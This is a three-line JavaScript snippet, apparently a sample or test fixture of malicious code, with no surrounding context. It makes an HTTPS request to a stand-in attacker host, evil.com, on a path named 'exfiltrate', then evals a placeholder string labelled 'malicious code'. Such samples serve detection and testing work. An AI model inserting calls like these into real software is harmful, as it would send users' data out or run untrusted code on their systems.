const https = require('https');
https.get('https://evil.com/exfiltrate');
eval("malicious code");